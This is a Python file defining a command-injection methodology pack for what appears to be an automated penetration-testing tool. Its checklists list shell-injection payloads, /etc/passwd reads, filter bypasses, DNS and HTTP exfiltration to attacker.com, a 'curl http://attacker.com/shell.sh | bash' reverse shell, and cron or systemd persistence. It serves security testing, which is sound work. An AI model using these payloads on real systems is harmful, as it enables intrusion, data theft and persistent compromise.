"""Command Injection Methodology Pack."""

from deephunter.core.types import BugClass
from deephunter.methodology.packs.base import (
    DecisionTreeBranch,
    DecisionTreeNode,
    MethodologyPack,
    PackCategory,
    PackChecklist,
    PackPlannerRule,
)

PACK = MethodologyPack(
    name="Command Injection",
    version="1.0.0",
    category=PackCategory.CROSS_CUTTING,
    description="Expert methodology for identifying and exploiting OS command injection vulnerabilities. Covers shell metacharacter injection, argument injection, environment variable injection, time-of-check-time-of-use (TOCTOU) race conditions, and achieving RCE from command injection.",
    supported_technologies=["Python", "PHP", "Node.js", "Ruby", "Java", "Go", ".NET", "Bash", "Shell"],
    attack_surface_areas=["rce", "os-command", "shell-injection", "command-execution", "backdoor"],
    investigation_priority=99,
    related_packs=["SQL Injection", "File Upload", "Deserialization", "SSRF"],

    checklists=[
        PackChecklist(
            objective="Identify command injection entry points",
            description="Find all locations where user input reaches OS command execution functions.",
            procedure="1. Search for exec(), shell_exec(), system(), passthru(), popen(), proc_open() in Python/PHP\n2. Look for child_process.exec/spawn in Node.js\n3. Look for Runtime.exec() and ProcessBuilder in Java\n4. Look for os/exec in Ruby\n5. Look for os/exec.Command in Go\n6. Check for shell=True or shell='/bin/bash' in any subprocess call\n7. Look for backtick operator (`) in PHP and shell in Ruby\n8. Search for template strings with user input passed to command execution",
            priority="critical",
            difficulty="easy",
            required_evidence=["List of command execution entry points"],
            expected_result="All command injection entry points identified",
            bug_classes=[BugClass.RCE, BugClass.COMMAND_INJECTION],
            tags=["rce", "command-injection", "identification"],
        ),
        PackChecklist(
            objective="Test basic command injection with metacharacters",
            description="Test each entry point with shell metacharacters to confirm command injection.",
            procedure="1. Append ; whoami to injected parameter\n2. Try | whoami, & whoami, && whoami\n3. Try `whoami` (backticks) or $(whoami)\n4. Try newline injection: %0Awhoami\n5. Try > /tmp/pwned to write file\n6. Try && curl http://attacker.com to verify OOB interaction\n7. Test URL encoding of metacharacters\n8. Test double URL encoding",
            priority="critical",
            difficulty="easy",
            required_evidence=["Command output visible in response or OOB interaction confirmed"],
            expected_result="Command injection confirmed with visible output",
            bug_classes=[BugClass.RCE, BugClass.COMMAND_INJECTION],
            tags=["rce", "command-injection", "shell-metacharacters"],
        ),
        PackChecklist(
            objective="Test blind command injection",
            description="Detect command injection that produces no visible output using time-based and OOB techniques.",
            procedure="1. Time-based: sleep 5 if injection works (Linux: sleep 5; curl http://attacker.com)\n2. DNS OOB: nslookup $(whoami).attacker.com or curl http://$(whoami).attacker.com\n3. HTTP OOB: wget/curl to attacker.com with hostname in path\n4. Ping OOB: ping -c 1 $(whoami).attacker.com\n5. Check for network connectivity to external hosts from server\n6. Try email OOB via sendmail or mail command\n7. Test both Unix (sleep) and Windows (timeout /t 5) commands",
            priority="critical",
            difficulty="medium",
            required_evidence=["Time delay, DNS lookup, or HTTP request to attacker server"],
            expected_result="Blind command injection confirmed",
            bug_classes=[BugClass.RCE, BugClass.COMMAND_INJECTION],
            tags=["rce", "blind", "oob", "dns-exfiltration"],
        ),
        PackChecklist(
            objective="Escalate to full RCE from command injection",
            description="Convert basic command injection to a fully interactive shell with proper TTY.",
            procedure="1. Test for stdin availability with interactive shell: python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n2. Upload a reverse shell: curl http://attacker.com/shell.sh | bash\n3. Test for network connectivity to attacker\n4. Check available utilities: python, perl, ruby, php, nc, bash\n5. Check if > /dev/null suppresses output — use file writes instead\n6. Test for restricted shell (rbash) — try to break out\n7. Test for known GTFO bins (sudo, find, vim, less, etc.)\n8. Check if cron or systemd can be used for persistence",
            priority="critical",
            difficulty="hard",
            required_evidence=["Reverse shell or interactive session established"],
            expected_result="Full RCE with shell access achieved",
            bug_classes=[BugClass.RCE, BugClass.COMMAND_INJECTION],
            tags=["rce", "reverse-shell", "privesc", "persistence"],
        ),
        PackChecklist(
            objective="Test argument injection vs shell injection",
            description="Distinguish between shell injection (metacharacters work) and argument injection (only args affected).",
            procedure="1. shell=True: try ; cat /etc/passwd (works if shell metacharacters processed)\n2. shell=False: try injecting new arguments to existing command\n3. With shell=False, test: id && whoami (id should run, && whoami may be ignored or fail)\n4. Check if the application escapes metacharacters but not arguments\n5. Look at the actual function call: subprocess.run(['ls', user_input]) vs subprocess.run(user_input, shell=True)\n6. With shell=False, test command chaining fails — just find argument injection",
            priority="high",
            difficulty="medium",
            required_evidence=["Injection type identified: shell vs argument"],
            expected_result="Injection type determined and documented",
            bug_classes=[BugClass.RCE, BugClass.COMMAND_INJECTION],
            tags=["rce", "argument-injection", "shell-injection"],
        ),
        PackChecklist(
            objective="Test for command injection filters and bypasses",
            description="Test various filter bypasses when basic injection is blocked.",
            procedure="1. Blocked ; ? Try %3B, %0A, ${IFS}, ${{IFS}}, <>${IFS},\n2. Blocked whitespace ? Try ${IFS}, $IFS, %09 (tab), {cat,/etc/passwd}\n3. Blocked / ? Try $(printf%20\"\\x2f\" etc/passwd) or builtin echo\n4. Blocked alphanumeric ? Try printf, echo with hex/octal\n5. Blocked common commands ? Try /usr/bin/cat, /bin//cat\n6. Blocked . (dot) ? Try /usr/bin/xargs</command>\n7. Use null byte injection: file%00.txt (truncated before .txt)\n8. Try wildcard injection: $(cat /etc/*/passwd) or /???/??t /etc/?ass??",
            priority="high",
            difficulty="hard",
            required_evidence=["Filter bypass achieved"],
            expected_result="Command injection works despite filters",
            bug_classes=[BugClass.RCE, BugClass.COMMAND_INJECTION],
            tags=["rce", "filter-bypass", "encoding", "obfuscation"],
        ),
    ],

    decision_trees=[
        DecisionTreeNode(
            id="cmd-root",
            question="What command injection scenario?",
            branches=[
                DecisionTreeBranch(
                    condition="Visible output in response",
                    conclusion="TEST: 1. Inject ; echo INJECTED 2. Try all metacharacters 3. Confirm with hostname, id, pwd 4. Escalate to shell",
                ),
                DecisionTreeBranch(
                    condition="No visible output",
                    conclusion="TEST: 1. DNS OOB: $(curl http://attacker.com/$(hostname) 2. Time-based: sleep 5 3. HTTP OOB: wget to attacker.com 4. Escalate if confirmed",
                ),
                DecisionTreeBranch(
                    condition="shell=False (argument injection only)",
                    conclusion="TEST: 1. Inject arguments: --help, -la, -c 'id' 2. Test for command substitution blocked 3. Try to inject flags that enable dangerous options",
                ),
                DecisionTreeBranch(
                    condition="Input is filtered/blocked",
                    conclusion="TEST: 1. Bypass with IFS 2. Use encoding tricks 3. Find alternate commands 4. Try wildcard injection 5. Test null byte truncation",
                ),
            ],
        ),
    ],

    planner_rules=[
        PackPlannerRule(attack_surface="rce", description="Prioritize command injection testing on exec/shell endpoints", priority_modifier=0.30, phase="input_validation"),
        PackPlannerRule(attack_surface="rce", description="Test command injection with blind OOB techniques when output not visible", priority_modifier=0.20, phase="exploitation"),
        PackPlannerRule(attack_surface="rce", description="Escalate any confirmed command injection to full RCE with reverse shell", priority_modifier=0.25, phase="exploitation"),
    ],

    references=[
        {"source": "OWASP", "id": "A1", "title": "OWASP Command Injection", "url": "https://owasp.org/www-project-web-security-testing-guide/"},
        {"source": "PortSwigger", "id": "OS", "title": "OS Command Injection", "url": "https://portswigger.net/web-security/os-command-injection"},
        {"source": "PentesterLand", "id": "CMD", "title": "Command Injection Cheat Sheet", "url": "https://pentesterland.com/command-injection-cheat-sheet/"},
    ],
    tags=["rce", "command-injection", "shell", "os"],
)